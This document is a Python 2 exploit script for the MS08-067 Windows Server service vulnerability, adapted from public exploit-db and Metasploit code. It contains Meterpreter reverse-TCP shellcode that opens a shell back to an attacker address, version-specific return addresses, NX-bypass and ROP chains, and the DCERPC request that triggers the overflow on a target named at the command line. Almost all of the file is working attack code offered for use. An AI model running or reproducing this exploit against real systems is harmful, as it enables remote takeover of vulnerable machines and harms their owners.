import struct
import time
import sys
from threading import Thread    #Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    from impacket.dcerpc import dcerpc
    from impacket.dcerpc import transport
except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)


print '#######################################################################'
print '#   MS08-067 Exploit'
print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
buf="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf += "\x29\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xc0\x26\x84\x9d\x83\xee\xfc\xe2\xf4\x3c\xce"
buf += "\x06\x9d\xc0\x26\xe4\x14\x25\x17\x44\xf9\x4b\x76\xb4"
buf += "\x16\x92\x2a\x0f\xcf\xd4\xad\xf6\xb5\xcf\x91\xce\xbb"
buf += "\xf1\xd9\x28\xa1\xa1\x5a\x86\xb1\xe0\xe7\x4b\x90\xc1"
buf += "\xe1\x66\x6f\x92\x71\x0f\xcf\xd0\xad\xce\xa1\x4b\x6a"
buf += "\x95\xe5\x23\x6e\x85\x4c\x91\xad\xdd\xbd\xc1\xf5\x0f"
buf += "\xd4\xd8\xc5\xbe\xd4\x4b\x12\x0f\x9c\x16\x17\x7b\x31"
buf += "\x01\xe9\x89\x9c\x07\x1e\x64\xe8\x36\x25\xf9\x65\xfb"
buf += "\x5b\xa0\xe8\x24\x7e\x0f\xc5\xe4\x27\x57\xfb\x4b\x2a"
buf += "\xcf\x16\x98\x3a\x85\x4e\x4b\x22\x0f\x9c\x10\xaf\xc0"
buf += "\xb9\xe4\x7d\xdf\xfc\x99\x7c\xd5\x62\x20\x79\xdb\xc7"
buf += "\x4b\x34\x6f\x10\x9d\x4e\xb7\xaf\xc0\x26\xec\xea\xb3"
buf += "\x14\xdb\xc9\xa8\x6a\xf3\xbb\xc7\xd9\x51\x25\x50\x27"
buf += "\x84\x9d\xe9\xe2\xd0\xcd\xa8\x0f\x04\xf6\xc0\xd9\x51"
buf += "\xf7\xc5\x4e\x8e\x96\xc0\xea\xec\x9f\xc0\x27\x3f\x14"
buf += "\x26\x76\xd4\xcd\x90\x66\xd4\xdd\x90\x4e\x6e\x92\x1f"
buf += "\xc6\x7b\x48\x57\x4c\x94\xcb\x97\x4e\x1d\x38\xb4\x47"
buf += "\x7b\x48\x45\xe6\xf0\x97\x3f\x68\x8c\xe8\x2c\xce\xe5"
buf += "\x9d\xc0\x26\xee\x9d\xaa\x22\xd2\xca\xa8\x24\x5d\x55"
buf += "\x9f\xd9\x51\x1e\x38\x26\xfa\xab\x4b\x10\xee\xdd\xa8"
buf += "\x26\x94\x9d\xc0\x70\xee\x9d\xa8\x7e\x20\xce\x25\xd9"
buf += "\x51\x0e\x93\x4c\x84\xcb\x93\x71\xec\x9f\x19\xee\xdb"
buf += "\x62\x15\xa5\x7c\x9d\xbd\x04\xdc\xf5\xc0\x66\x84\x9d"
buf += "\xaa\x26\xd4\xf5\xcb\x09\x8b\xad\x3f\xf3\xd3\xf5\xb5"
buf += "\x48\xc9\xfc\x3f\xf3\xda\xc3\x3f\x2a\xa0\x74\xb1\xd9"
buf += "\x7b\x62\xc1\xe5\xad\x5b\xb5\xe1\x47\x26\x20\x3b\xae"
buf += "\x97\xa8\x80\x11\x20\x5d\xd9\x51\xa1\xc6\x5a\x8e\x1d"
buf += "\x3b\xc6\xf1\x98\x7b\x61\x97\xef\xaf\x4c\x84\xce\x3f"
buf += "\xf3\x84\x9d"

nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000

def generate_rop(rvas):
    gadget1="\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3="\xcc\x90\xeb\x5a"
    ret=struct.pack('<L', 0x00018000)
    ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
    ret+=struct.pack('<L', 0x01040110)
    ret+=struct.pack('<L', 0x01010101)
    ret+=struct.pack('<L', 0x01010101)
    ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
    ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
    ret+=gadget1
    ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['jmp eax']+module_base)
    ret+=gadget2[0]
    ret+=gadget2[1]
    ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
    ret+=gadget2[2]
    ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
    ret+=struct.pack('<L', rvas['jmp eax']+module_base)
    ret+=gadget3
    return ret

class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.__port = port
        self.target = target
        self.os = os


    def __DCEPacket(self):
        if (self.os=='1'):
            print 'Windows XP SP0/SP1 Universal\n'
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='2'):
            print 'Windows 2000 Universal\n'
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='3'):
            print 'Windows 2003 SP0 Universal\n'
            ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
        elif (self.os=='5'):
            print 'Windows XP SP3 French (NX)\n'
            ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2
            jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
        elif (self.os=='6'):
            print 'Windows XP SP3 English (NX)\n'
            ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2
            jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
        elif (self.os=='7'):
            print 'Windows XP SP3 English (AlwaysOn NX)\n'
            rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
            jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
        else:
            print 'Not supported OS version\n'
            sys.exit(-1)
        print '[-]Initiating connection'
        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + buf +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2
        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"
        return



    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(5)
        print 'Exploit finish\n'

if __name__ == '__main__':
    try:
        target = sys.argv[1]
        os = sys.argv[2]
    except IndexError:
        print '\nUsage: %s <target ip>\n' % sys.argv[0]
        print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
        print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'
        sys.exit(-1)

current = SRVSVC_Exploit(target, os)
current.start()





